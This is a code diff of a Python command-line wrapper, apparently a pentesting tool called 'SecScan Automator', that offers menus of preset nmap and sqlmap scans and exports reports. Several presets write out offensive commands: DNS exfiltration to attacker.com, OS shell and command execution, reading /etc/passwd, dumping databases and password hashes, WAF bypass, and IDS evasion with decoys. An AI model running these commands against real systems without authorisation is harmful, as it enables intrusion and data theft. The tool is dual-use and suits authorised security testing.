-            {'name': 'Basic SQL Injection', 'command': '--batch --dbs', 'description': 'Basic SQL injection detection'},
-            {'name': 'Cookie Testing', 'command': '--cookie="id=1" --dbs', 'description': 'Test cookies for SQL injection'},
-            {'name': 'POST Data Test', 'command': '--data="id=1" --dbs', 'description': 'Test POST data for injection'},
-            {'name': 'Get Databases', 'command': '--batch --dbs', 'description': 'Enumerate available databases'},
-            {'name': 'Get Tables', 'command': '--batch -D testdb --tables', 'description': 'List tables in database'},
-            {'name': 'Get Columns', 'command': '--batch -D testdb -T users --columns', 'description': 'List columns in table'},
-            {'name': 'Dump Data', 'command': '--batch -D testdb -T users --dump', 'description': 'Extract data from table'},
-            {'name': 'Current User', 'command': '--batch --current-user', 'description': 'Get current database user'},
-            {'name': 'Current Database', 'command': '--batch --current-db', 'description': 'Get current database name'},
-            {'name': 'Database Users', 'command': '--batch --users', 'description': 'List database users'}
-        ],
-        'medium': [
-            {'name': 'Advanced Detection', 'command': '--batch --level=3 --risk=2 --dbs', 'description': 'Medium risk/level detection'},
-            {'name': 'Time-based Blind', 'command': '--batch --technique=T --dbs', 'description': 'Time-based blind SQL injection'},
-            {'name': 'Boolean Blind', 'command': '--batch --technique=B --dbs', 'description': 'Boolean-based blind injection'},
-            {'name': 'Error-based', 'command': '--batch --technique=E --dbs', 'description': 'Error-based SQL injection'},
-            {'name': 'Union-based', 'command': '--batch --technique=U --dbs', 'description': 'Union-based injection'},
-            {'name': 'Stacked Queries', 'command': '--batch --technique=S --dbs', 'description': 'Stacked queries injection'},
-            {'name': 'WAF Bypass', 'command': '--batch --tamper=space2comment --dbs', 'description': 'Bypass WAF protections'},
-            {'name': 'Proxy Usage', 'command': '--batch --proxy=http://127.0.0.1:8080 --dbs', 'description': 'Use proxy for requests'},
-            {'name': 'Custom Headers', 'command': '--batch --headers="X-Forwarded-For: 127.0.0.1" --dbs', 'description': 'Add custom headers'},
-            {'name': 'Thread Testing', 'command': '--batch --threads=5 --dbs', 'description': 'Multi-threaded testing'}
-        ],
-        'hard': [
-            {'name': 'Maximum Risk', 'command': '--batch --level=5 --risk=3 --dbs', 'description': 'Highest risk and level testing'},
-            {'name': 'All Techniques', 'command': '--batch --technique=BEUSTQ --dbs', 'description': 'Use all injection techniques'},
-            {'name': 'WAF Evasion', 'command': '--batch --tamper=apostrophemask,apostrophenullencode,base64encode --dbs', 'description': 'Advanced WAF evasion'},
-            {'name': 'DNS Exfiltration', 'command': '--batch --dns-domain=attacker.com --dbs', 'description': 'DNS-based data exfiltration'},
-            {'name': 'OS Command Exec', 'command': '--batch --os-cmd=whoami', 'description': 'Execute OS commands'},
-            {'name': 'SQL Shell', 'command': '--batch --sql-shell', 'description': 'Interactive SQL shell'},
-            {'name': 'OS Shell', 'command': '--batch --os-shell', 'description': 'Interactive OS shell'},
-            {'name': 'File System', 'command': '--batch --file-read=/etc/passwd', 'description': 'Read system files'},
-            {'name': 'Registry Access', 'command': '--batch --reg-read', 'description': 'Windows registry access'},
-            {'name': 'Database Takeover', 'command': '--batch --all --exclude-sysdbs', 'description': 'Complete database takeover'}
-        ]
-    }
-    
-    @staticmethod
-    def get_templates(scan_type, mode):
-        try:
-            if scan_type == 'nmap':
-                return ScanTemplates.NMAP_TEMPLATES.get(mode, [])
-            elif scan_type == 'sqlmap':
-                return ScanTemplates.SQLMAP_TEMPLATES.get(mode, [])
-            return []
-        except Exception:
-            return []
-
-class AdvancedProgressBar:
-    def __init__(self, total=100, width=60, title="Processing"):
-        self.total = max(1, total)
-        self.width = max(20, width)
-        self.title = str(title)[:50]
-        self.current = 0
-        self.running = False
-        self.thread = None
-        self.start_time = time.time()
-        self.chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
-        self.char_index = 0
-        self._lock = threading.Lock()
-        self.current_substep = ""
-    
-    def start(self):
-        try:
-            with self._lock:
-                if not self.running:
-                    self.running = True
-                    self.start_time = time.time()
-                    self.thread = threading.Thread(target=self._animate)
-                    self.thread.daemon = True
-                    self.thread.start()
-        except Exception:
-            pass
-    
-    def stop(self):
-        try:
-            with self._lock:
-                self.running = False
-            if self.thread and self.thread.is_alive():
-                self.thread.join(timeout=1)
-            print()
-        except Exception:
-            pass
-    
-    def update(self, current, substep=""):
-        try:
-            with self._lock:
-                self.current = max(0, min(current, self.total))
-                self.current_substep = substep[:30]
-        except Exception:
-            pass
-    
-    def _animate(self):
-        try:
-            while self.running:
-                with self._lock:
-                    percent = (self.current / self.total) * 100
-                    filled_width = int((self.current / self.total) * self.width)
-                    elapsed = time.time() - self.start_time
-                    
-                    if percent > 0:
-                        eta = (elapsed / percent) * (100 - percent)
-                        eta_str = f"ETA: {int(eta//60):02d}:{int(eta%60):02d}"
-                    else:
-                        eta_str = "ETA: --:--"
-                
-                bar_color = Colors.GREEN if percent > 75 else Colors.YELLOW if percent > 25 else Colors.RED
-                bar = f"{bar_color}{'█' * filled_width}{Colors.GRAY}{'░' * (self.width - filled_width)}{Colors.END}"
-                
-                spinner = self.chars[self.char_index]
-                self.char_index = (self.char_index + 1) % len(self.chars)
-                
-                elapsed_str = f"{int(elapsed//60):02d}:{int(elapsed%60):02d}"
-                
-                status_line = f"\r{Colors.CYAN}{spinner} {self.title}{Colors.END} [{bar}] {Colors.BOLD}{percent:5.1f}%{Colors.END}"
-                status_line += f" | {Colors.BLUE}{elapsed_str}{Colors.END} | {Colors.YELLOW}{eta_str}{Colors.END}"
-                
-                if self.current_substep:
-                    status_line += f" | {Colors.MAGENTA}{self.current_substep}{Colors.END}"
-                
-                print(status_line, end='', flush=True)
-                time.sleep(0.1)
-        except Exception:
-            pass
-
-class ReportManager:
-    def __init__(self, db_manager):
-        self.db_manager = db_manager
-        self.reports_dir = "reports"
-        self.ensure_reports_directory()
-    
-    def ensure_reports_directory(self):
-        try:
-            if not os.path.exists(self.reports_dir):
-                os.makedirs(self.reports_dir)
-        except Exception:
-            pass
-    
-    def generate_report_filename(self, scan_type, target, mode):
-        try:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            clean_target = re.sub(r'[^\w\-_\.]', '_', target)[:20]
-            filename = f"{scan_type}_{mode}_{clean_target}_{timestamp}"
-            return filename
-        except Exception:
-            return f"scan_report_{int(time.time())}"
-    
-    def create_html_report(self, scan_data):
-        try:
-            filename = self.generate_report_filename(scan_data['scan_type'], scan_data['target'], scan_data['mode'])
-            filepath = os.path.join(self.reports_dir, f"{filename}.html")
-            
-            html_content = self._generate_html_content(scan_data)
-            
-            with open(filepath, 'w', encoding='utf-8') as f:
-                f.write(html_content)
-            
-            return filepath
+        except KeyboardInterrupt:
+            console.print("\n[bold yellow]⚠️  Scan interrupted by user[/bold yellow]")
+            return False
         except Exception as e:
-            self.db_manager.log_error("CreateHTMLReport", str(e))
-            return None
+            console.print(f"\n[bold red]❌ Error: {str(e)}[/bold red]")
+            return False
     
-    def create_text_report(self, scan_data):
+    def export_scan_results(self, log_data):
+        export_formats = ["1", "2", "3", "0"]
+        
+        console.print("\n[bold cyan]📤 Export Options:[/bold cyan]")
+        console.print("  1. JSON Format")
+        console.print("  2. CSV Format")
+        console.print("  3. HTML Report")
+        console.print("  0. Cancel")
+        
+        choice = self.validate_input("\n[yellow]Select export format[/yellow]", export_formats)
+        
+        if choice == "0":
+            return
+        
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        
         try:
-            filename = self.generate_report_filename(scan_data['scan_type'], scan_data['target'], scan_data['mode'])
-            filepath = os.path.join(self.reports_dir, f"{filename}.txt")
-            
-            text_content = self._generate_text_content(scan_data)
-            
-            with open(filepath, 'w', encoding='utf-8') as f:
-                f.write(text_content)
-            
-            return filepath
-        except Exception as e:
-            self.db_manager.log_error("CreateTextReport", str(e))
-            return None
-    
-    def create_json_report(self, scan_data):
-        try:
-            filename = self.generate_report_filename(scan_data['scan_type'], scan_data['target'], scan_data['mode'])
-            filepath = os.path.join(self.reports_dir, f"{filename}.json")
-            
-            json_data = {
-                'report_metadata': {
-                    'generated_at': datetime.now().isoformat(),
-                    'tool': 'SecScan Automator',
-                    'version': '2.0'
-                },
-                'scan_information': scan_data,
-                'timestamp': datetime.now().isoformat()
-            }
-            
-            with open(filepath, 'w', encoding='utf-8') as f:
-                json.dump(json_data, f, indent=2, ensure_ascii=False)
-            
-            return filepath
-        except Exception as e:
-            self.db_manager.log_error("CreateJSONReport", str(e))
-            return None
-    
-    def _generate_html_content(self, scan_data):
-        try:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            html_template = f"""
+            if choice == "1":
+                export_path = self.export_dir / f"scan_export_{timestamp}.json"
+                with open(export_path, 'w') as f:
+                    json.dump(log_data, f, indent=2)
+                console.print(f"\n[green]✅ Exported to: {export_path}[/green]")
+                
+            elif choice == "2":
+                export_path = self.export_dir / f"scan_export_{timestamp}.csv"
+                with open(export_path, 'w', newline='') as f:
+                    writer = csv.writer(f)
+                    writer.writerow(['Field', 'Value'])
+                    for key, value in log_data.items():
+                        if key != 'output':
+                            writer.writerow([key, value])
+                console.print(f"\n[green]✅ Exported to: {export_path}[/green]")
+                
+            elif choice == "3":
+                export_path = self.export_dir / f"scan_report_{timestamp}.html"
+                html_content = f"""
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SecScan Automator - Scan Report</title>
+    <title>Scan Report - {log_data['scan_type']}</title>
     <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: 'Segoe UI', sans-serif; background: #f5f7fa; line-height: 1.6; }}
-        .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
-        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px; }}
-        .header h1 {{ font-size: 2.5em; margin-bottom: 10px; }}
-        .card {{ background: white; padding: 25px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); margin-bottom: 20px; }}
-        .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }}
-        .info-item {{ padding: 15px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #3498db; }}
-        .info-label {{ font-weight: bold; color: #2c3e50; }}
-        .info-value {{ color: #34495e; margin-top: 5px; }}
-        .results {{ background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 8px; overflow-x: auto; }}
-        .results pre {{ white-space: pre-wrap; word-wrap: break-word; }}
+        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
+        .container {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
+        h1 {{ color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
+        .info {{ background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 20px 0; }}
+        .label {{ font-weight: bold; color: #34495e; }}
+        .value {{ color: #16a085; }}
+        pre {{ background: #2c3e50; color: #ecf0f1; padding: 20px; border-radius: 5px; overflow-x: auto; }}
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🛡️ SecScan Automator</h1>
-            <p>Security Scanning Report</p>
-            <p>Generated on {timestamp}</p>
+        <h1>🛡️ Security Scan Report</h1>
+        <div class="info">
+            <p><span class="label">Scan Type:</span> <span class="value">{log_data['scan_type']}</span></p>
+            <p><span class="label">Target:</span> <span class="value">{log_data['target']}</span></p>
+            <p><span class="label">Timestamp:</span> <span class="value">{log_data['timestamp']}</span></p>
+            <p><span class="label">Duration:</span> <span class="value">{log_data.get('duration', 0):.2f} seconds</span></p>
+            <p><span class="label">Status:</span> <span class="value">{log_data['status']}</span></p>
         </div>
-        
-        <div class="card">
-            <h3>📊 Scan Information</h3>
-            <div class="info-grid">
-                <div class="info-item">
-                    <div class="info-label">Scan Type</div>
-                    <div class="info-value">{scan_data.get('scan_type', 'Unknown').upper()}</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Target</div>
-                    <div class="info-value">{scan_data.get('target', 'Unknown')}</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Mode</div>
-                    <div class="info-value">{scan_data.get('mode', 'Unknown').upper()}</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Duration</div>
-                    <div class="info-value">{scan_data.get('duration', 0):.2f} seconds</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Command</div>
-                    <div class="info-value">{scan_data.get('command', 'Unknown')}</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Status</div>
-                    <div class="info-value">Completed</div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="card">
-            <h3>🔍 Scan Results</h3>
-            <div class="results">
-                <pre>{scan_data.get('result', 'No results available')}</pre>
-            </div>
-        </div>
-        
-        {f'<div class="card"><h3>📝 Notes</h3><p>{scan_data.get("notes", "")}</p></div>' if scan_data.get('notes') else ''}
+        <h2>Command Executed</h2>
+        <pre>{log_data['command']}</pre>
+        <h2>Scan Output</h2>
+        <pre>{log_data['output'][:5000]}</pre>
     </div>
 </body>
 </html>
-"""
-            return html_template
-        except Exception:
-            return "<html><body><h1>Error generating report</h1></body></html>"
-    
-    def _generate_text_content(self, scan_data):
-        try:
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            
-            content = f"""
-SecScan Automator - Scan Report
-{'='*50}
-
-Date/Time: {timestamp}
-Scan Type: {scan_data.get('scan_type', 'Unknown').upper()}
-Target: {scan_data.get('target', 'Unknown')}
-Mode: {scan_data.get('mode', 'Unknown').upper()}
-Duration: {scan_data.get('duration', 0):.2f} seconds
-Command: {scan_data.get('command', 'Unknown')}
-
-{'='*50}
-SCAN RESULTS
-{'='*50}
-
-{scan_data.get('result', 'No results available')}
-
-{'='*50}
-NOTES
-{'='*50}
-
-{scan_data.get('notes', 'No notes added.')}
-
-{'='*50}
-END OF REPORT
-{'='*50}
-"""
-            return content
-        except Exception:
-            return "Error generating report content"
-    
-    def export_reports(self, export_format='json', date_from=None, date_to=None):
-        try:
-            reports = self.db_manager.get_reports(limit=1000, date_from=date_from, date_to=date_to)
-            
-            if not reports:
-                return None
-            
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            
-            if export_format.lower() == 'csv':
-                filename = f"reports_export_{timestamp}.csv"
-                return self._export_to_csv(reports, filename)
-            elif export_format.lower() == 'json':
-                filename = f"reports_export_{timestamp}.json"
-                return self._export_to_json(reports, filename)
-            else:
-                return None
+                """
+                with open(export_path, 'w') as f:
+                    f.write(html_content)
+                console.print(f"\n[green]✅ HTML report generated: {export_path}[/green]")
                 
         except Exception as e:
-            self.db_manager.log_error("ExportReports", str(e))
-            return None
+            console.print(f"[red]❌ Export failed: {str(e)}[/red]")
     
-    def _export_to_csv(self, reports, filename):
-        try:
-            filepath = os.path.join(self.reports_dir, filename)
+    def nmap_scanner_menu(self):
+        while True:
+            self.clear_screen()
+            self.show_banner()
             
-            with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
-                writer = csv.writer(csvfile)
-                
-                # Header
-                writer.writerow(['ID', 'Name', 'Target', 'Scan Type', 'Mode', 'Created Date', 'Duration', 'Vulnerabilities', 'Risk Score', 'Notes'])
-                
-                # Data
-                for report in reports:
-                    writer.writerow([
-                        report[0],  # id
-                        report[1],  # name
-                        report[2],  # target
-                        report[3],  # scan_type
-                        report[4],  # mode
-                        report[5],  # created_date
-                        report[9] if len(report) > 9 else 0,  # duration
-                        report[10] if len(report) > 10 else 0,  # vulnerability_count
-                        report[11] if len(report) > 11 else 0,  # risk_score
-                        report[7] if len(report) > 7 else ''   # notes
-                    ])
+            console.print("\n")
+            console.print(Align.center("[bold cyan]🔍 NMAP NETWORK SCANNER[/bold cyan]"))
+            console.print("\n")
             
-            return filepath
-        except Exception:
-            return None
+            level_table = Table(show_header=True, header_style="bold magenta", box=box.HEAVY, expand=True)
+            level_table.add_column("🎯 Level", style="cyan", width=15, justify="center")
+            level_table.add_column("📝 Description", width=50)
+            level_table.add_column("⏱️  Speed", width=15, justify="center")
+            
+            level_table.add_row("1", "⚡ Easy - Quick & Basic Scans", "[green]Fast[/green]")
+            level_table.add_row("2", "🔧 Medium - Standard Scans", "[yellow]Moderate[/yellow]")
+            level_table.add_row("3", "🔥 Hard - Advanced & Comprehensive", "[red]Slow[/red]")
+            level_table.add_row("4", "⭐ Quick Profiles - Predefined Scans", "[cyan]Varies[/cyan]")
+            level_table.add_row("0", "⬅️  Back to Main Menu", "")
+            
+            console.print(level_table)
+            
+            choice = self.validate_input("\n[bold yellow]Select scan level[/bold yellow]", ["1", "2", "3", "4", "0"])
+            
+            if choice == "0":
+                break
+            elif choice == "1":
+                self.nmap_easy_scans()
+            elif choice == "2":
+                self.nmap_medium_scans()
+            elif choice == "3":
+                self.nmap_hard_scans()
+            elif choice == "4":
+                self.quick_scan_profiles("nmap")
     
-    def _export_to_json(self, reports, filename):
-        try:
-            filepath = os.path.join(self.reports_dir, filename)
+    def nmap_easy_scans(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold green]⚡ NMAP EASY SCANS[/bold green]"))
+        console.print("\n")
+        
+        scans = {
+            "1": {"name": "Quick Ping Sweep", "desc": "Check if hosts are alive", "cmd": "nmap -sn {target}", "time": "~5 sec"},
+            "2": {"name": "Fast Port Scan", "desc": "Scan top 100 ports", "cmd": "nmap -F {target}", "time": "~10 sec"},
+            "3": {"name": "Basic TCP Scan", "desc": "Simple TCP connect", "cmd": "nmap -sT {target}", "time": "~30 sec"},
+            "4": {"name": "Top 1000 Ports", "desc": "Most common ports", "cmd": "nmap --top-ports 1000 {target}", "time": "~1 min"},
+            "5": {"name": "Version Detection Light", "desc": "Quick service versions", "cmd": "nmap -sV --version-light {target}", "time": "~45 sec"},
+            "6": {"name": "Basic OS Detection", "desc": "Simple fingerprinting", "cmd": "nmap -O --osscan-guess {target}", "time": "~40 sec"},
+            "7": {"name": "Default Scripts", "desc": "Safe NSE scripts", "cmd": "nmap -sC {target}", "time": "~1 min"},
+            "8": {"name": "UDP Quick Scan", "desc": "Top 20 UDP ports", "cmd": "nmap -sU --top-ports 20 {target}", "time": "~30 sec"},
+            "9": {"name": "Web Server Scan", "desc": "HTTP/HTTPS quick check", "cmd": "nmap -p 80,443,8080,8443 -sV {target}", "time": "~15 sec"},
+            "10": {"name": "Network Discovery", "desc": "Discover local network", "cmd": "nmap -sn {target}/24", "time": "~20 sec"},
+        }
+        
+        self.display_scan_menu(scans, "nmap_easy")
+    
+    def nmap_medium_scans(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold yellow]🔧 NMAP MEDIUM SCANS[/bold yellow]"))
+        console.print("\n")
+        
+        scans = {
+            "1": {"name": "SYN Stealth Scan", "desc": "Half-open TCP scan", "cmd": "sudo nmap -sS {target}", "time": "~2 min"},
+            "2": {"name": "Service & Version Full", "desc": "Detailed version detect", "cmd": "nmap -sV --version-all {target}", "time": "~3 min"},
+            "3": {"name": "OS Detection Enhanced", "desc": "Aggressive OS detection", "cmd": "sudo nmap -O --osscan-limit {target}", "time": "~2 min"},
+            "4": {"name": "Aggressive Scan", "desc": "OS, version, scripts", "cmd": "nmap -A -T4 {target}", "time": "~5 min"},
+            "5": {"name": "Vulnerability Scan", "desc": "Common vulnerabilities", "cmd": "nmap --script vuln {target}", "time": "~4 min"},
+            "6": {"name": "Full TCP Port Scan", "desc": "All 65535 ports", "cmd": "nmap -p- -T4 {target}", "time": "~10 min"},
+            "7": {"name": "UDP Common Ports", "desc": "Top 100 UDP services", "cmd": "sudo nmap -sU --top-ports 100 {target}", "time": "~5 min"},
+            "8": {"name": "Firewall Detection", "desc": "Detect firewall/IDS", "cmd": "nmap -sA -T4 {target}", "time": "~3 min"},
+            "9": {"name": "Service Scripts", "desc": "Service-specific NSE", "cmd": "nmap -sV --script=default {target}", "time": "~4 min"},
+            "10": {"name": "Fast Comprehensive", "desc": "Quick but thorough", "cmd": "nmap -T4 -F -sV -sC {target}", "time": "~2 min"},
+            "11": {"name": "SMB Enumeration", "desc": "Windows SMB scan", "cmd": "nmap --script smb-enum* -p 445,139 {target}", "time": "~3 min"},
+            "12": {"name": "DNS Enumeration", "desc": "DNS information", "cmd": "nmap --script dns-brute {target}", "time": "~2 min"},
+        }
+        
+        self.display_scan_menu(scans, "nmap_medium")
+    
+    def nmap_hard_scans(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold red]🔥 NMAP HARD SCANS[/bold red]"))
+        console.print(Align.center("[yellow]⚠️  Warning: Intensive scans that may take significant time[/yellow]"))
+        console.print("\n")
+        
+        scans = {
+            "1": {"name": "Full Comprehensive", "desc": "Complete analysis", "cmd": "sudo nmap -sS -sV -O -A -p- --script=default,vuln {target}", "time": "~30 min"},
+            "2": {"name": "Deep Vulnerability", "desc": "All vuln scripts", "cmd": "nmap -sV --script=vuln,exploit,auth -p- {target}", "time": "~25 min"},
+            "3": {"name": "Slow Stealth", "desc": "IDS evasion", "cmd": "sudo nmap -sS -T2 -f --data-length 200 -p- {target}", "time": "~60 min"},
+            "4": {"name": "Full UDP & TCP", "desc": "All ports both protocols", "cmd": "sudo nmap -sS -sU -p- {target}", "time": "~90 min"},
+            "5": {"name": "NSE Full Suite", "desc": "All NSE scripts", "cmd": "nmap --script=all -p- {target}", "time": "~45 min"},
+            "6": {"name": "Advanced OS Fingerprint", "desc": "Deep OS detection", "cmd": "sudo nmap -O --osscan-guess --fuzzy -sV -p- {target}", "time": "~35 min"},
+            "7": {"name": "Malware Detection", "desc": "Check backdoors", "cmd": "nmap --script=malware,backdoor -p- {target}", "time": "~20 min"},
+            "8": {"name": "Web Vulnerability", "desc": "HTTP/HTTPS vulns", "cmd": "nmap --script=http-vuln* -p 80,443,8080,8443 {target}", "time": "~15 min"},
+            "9": {"name": "Database Enumeration", "desc": "All DB services", "cmd": "nmap --script=mysql*,oracle*,ms-sql*,mongodb*,postgresql* -p 1433,1521,3306,5432,27017 {target}", "time": "~10 min"},
+            "10": {"name": "SSL/TLS Deep Analysis", "desc": "Complete SSL audit", "cmd": "nmap --script=ssl*,tls* -p 443,8443,465,993,995 {target}", "time": "~12 min"},
+            "11": {"name": "SMB Full Enumeration", "desc": "Complete Windows scan", "cmd": "nmap --script=smb-enum*,smb-vuln*,smb-os-discovery -p 445,139 {target}", "time": "~15 min"},
+            "12": {"name": "Network Topology", "desc": "Full network map", "cmd": "nmap -sn --traceroute --script=targets-traceroute {target}", "time": "~8 min"},
+            "13": {"name": "Banner Grabbing Advanced", "desc": "Detailed service info", "cmd": "nmap -sV --version-intensity 9 --script=banner -p- {target}", "time": "~25 min"},
+            "14": {"name": "Wireless Audit", "desc": "Wireless AP enum", "cmd": "nmap --script=broadcast-dhcp-discover,broadcast-wpad-discover {target}", "time": "~5 min"},
+            "15": {"name": "Firewall/IDS Evasion", "desc": "Fragmentation & decoys", "cmd": "sudo nmap -sS -f -D RND:10 --randomize-hosts -p- {target}", "time": "~40 min"},
+            "16": {"name": "IPv6 Full Scan", "desc": "Complete IPv6 scan", "cmd": "nmap -6 -sS -sV -O -p- {target}", "time": "~30 min"},
+            "17": {"name": "Ultimate Scan", "desc": "Everything enabled", "cmd": "sudo nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script=all -p- {target}", "time": "~120 min"},
+        }
+        
+        self.display_scan_menu(scans, "nmap_hard")
+    
+    def sqlmap_scanner_menu(self):
+        while True:
+            self.clear_screen()
+            self.show_banner()
             
-            export_data = {
-                'export_metadata': {
-                    'generated_at': datetime.now().isoformat(),
-                    'total_reports': len(reports),
-                    'tool': 'SecScan Automator'
-                },
-                'reports': []
+            console.print("\n")
+            console.print(Align.center("[bold cyan]💉 SQLMAP INJECTION SCANNER[/bold cyan]"))
+            console.print("\n")
+            
+            level_table = Table(show_header=True, header_style="bold magenta", box=box.HEAVY, expand=True)
+            level_table.add_column("🎯 Level", style="cyan", width=15, justify="center")
+            level_table.add_column("📝 Description", width=50)
+            level_table.add_column("⚡ Risk", width=15, justify="center")
+            
+            level_table.add_row("1", "⚡ Easy - Quick & Basic Tests", "[green]Low[/green]")
+            level_table.add_row("2", "🔧 Medium - Standard Tests", "[yellow]Medium[/yellow]")
+            level_table.add_row("3", "🔥 Hard - Advanced & Aggressive", "[red]High[/red]")
+            level_table.add_row("4", "⭐ Quick Profiles - Predefined Tests", "[cyan]Varies[/cyan]")
+            level_table.add_row("0", "⬅️  Back to Main Menu", "")
+            
+            console.print(level_table)
+            
+            choice = self.validate_input("\n[bold yellow]Select scan level[/bold yellow]", ["1", "2", "3", "4", "0"])
+            
+            if choice == "0":
+                break
+            elif choice == "1":
+                self.sqlmap_easy_scans()
+            elif choice == "2":
+                self.sqlmap_medium_scans()
+            elif choice == "3":
+                self.sqlmap_hard_scans()
+            elif choice == "4":
+                self.quick_scan_profiles("sqlmap")
+    
+    def sqlmap_easy_scans(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold green]⚡ SQLMAP EASY SCANS[/bold green]"))
+        console.print("\n")
+        
+        scans = {
+            "1": {"name": "Basic SQL Injection", "desc": "Quick vulnerability check", "cmd": "sqlmap -u {url} --batch --smart", "time": "~2 min"},
+            "2": {"name": "GET Parameter Test", "desc": "Test GET params", "cmd": "sqlmap -u {url} --batch --level=1 --risk=1", "time": "~3 min"},
+            "3": {"name": "List Databases", "desc": "Enumerate databases", "cmd": "sqlmap -u {url} --batch --dbs", "time": "~2 min"},
+            "4": {"name": "Current Database", "desc": "Get current DB name", "cmd": "sqlmap -u {url} --batch --current-db", "time": "~1 min"},
+            "5": {"name": "Current User", "desc": "Get DB user info", "cmd": "sqlmap -u {url} --batch --current-user", "time": "~1 min"},
+            "6": {"name": "Form Auto-Test", "desc": "Test HTML forms", "cmd": "sqlmap -u {url} --batch --forms", "time": "~3 min"},
+            "7": {"name": "Cookie Testing", "desc": "Test cookies", "cmd": "sqlmap -u {url} --batch --cookie={cookie}", "time": "~2 min"},
+            "8": {"name": "Quick Crawl", "desc": "Crawl & test site", "cmd": "sqlmap -u {url} --batch --crawl=2", "time": "~5 min"},
+            "9": {"name": "Check WAF", "desc": "Detect WAF/IPS", "cmd": "sqlmap -u {url} --batch --identify-waf", "time": "~1 min"},
+            "10": {"name": "Basic Banner Grab", "desc": "Get DB banner", "cmd": "sqlmap -u {url} --batch --banner", "time": "~1 min"},
+        }
+        
+        self.display_scan_menu(scans, "sqlmap_easy")
+    
+    def sqlmap_medium_scans(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold yellow]🔧 SQLMAP MEDIUM SCANS[/bold yellow]"))
+        console.print("\n")
+        
+        scans = {
+            "1": {"name": "Standard Injection", "desc": "Level 2, Risk 2", "cmd": "sqlmap -u {url} --batch --level=2 --risk=2", "time": "~5 min"},
+            "2": {"name": "Enumerate Tables", "desc": "List all tables", "cmd": "sqlmap -u {url} --batch -D {db} --tables", "time": "~3 min"},
+            "3": {"name": "Table Columns", "desc": "Get table structure", "cmd": "sqlmap -u {url} --batch -D {db} -T {table} --columns", "time": "~2 min"},
+            "4": {"name": "Dump Table Data", "desc": "Extract table data", "cmd": "sqlmap -u {url} --batch -D {db} -T {table} --dump", "time": "~5 min"},
+            "5": {"name": "POST Data Test", "desc": "Test POST params", "cmd": "sqlmap -u {url} --batch --data={postdata}", "time": "~4 min"},
+            "6": {"name": "Dump All Databases", "desc": "Extract all DBs", "cmd": "sqlmap -u {url} --batch --dump-all --exclude-sysdbs", "time": "~10 min"},
+            "7": {"name": "User Privileges", "desc": "Check permissions", "cmd": "sqlmap -u {url} --batch --privileges", "time": "~2 min"},
+            "8": {"name": "List DB Users", "desc": "Enumerate users", "cmd": "sqlmap -u {url} --batch --users", "time": "~2 min"},
+            "9": {"name": "Password Hashes", "desc": "Extract hashes", "cmd": "sqlmap -u {url} --batch --passwords", "time": "~3 min"},
+            "10": {"name": "SQL Queries", "desc": "Execute custom SQL", "cmd": "sqlmap -u {url} --batch --sql-query=\"SELECT @@version\"", "time": "~1 min"},
+            "11": {"name": "Bypass WAF", "desc": "Use tamper scripts", "cmd": "sqlmap -u {url} --batch --tamper=space2comment", "time": "~4 min"},
+            "12": {"name": "JSON Injection", "desc": "Test JSON params", "cmd": "sqlmap -u {url} --batch --json={jsondata}", "time": "~3 min"},
+        }
+        
+        self.display_scan_menu(scans, "sqlmap_medium")
+    
+    def sqlmap_hard_scans(self):
+        self.clear_screen()
+        self.show_banner()
+        
+        console.print("\n")
+        console.print(Align.center("[bold red]🔥 SQLMAP HARD SCANS[/bold red]"))
+        console.print(Align.center("[yellow]⚠️  Warning: Aggressive scans may trigger WAF/IDS[/yellow]"))
+        console.print("\n")
+        
+        scans = {
+            "1": {"name": "Maximum Level", "desc": "Level 5, Risk 3", "cmd": "sqlmap -u {url} --batch --level=5 --risk=3", "time": "~15 min"},
+            "2": {"name": "All Techniques", "desc": "Test all injection types", "cmd": "sqlmap -u {url} --batch --level=3 --risk=2 --technique=BEUSTQ", "time": "~10 min"},
+            "3": {"name": "Time-Based Blind", "desc": "Heavy time-based tests", "cmd": "sqlmap -u {url} --batch --level=4 --risk=3 --technique=T --time-sec=10", "time": "~20 min"},
+            "4": {"name": "Union-Based Advanced", "desc": "Advanced union queries", "cmd": "sqlmap -u {url} --batch --level=3 --risk=2 --technique=U --union-cols=15", "time": "~12 min"},
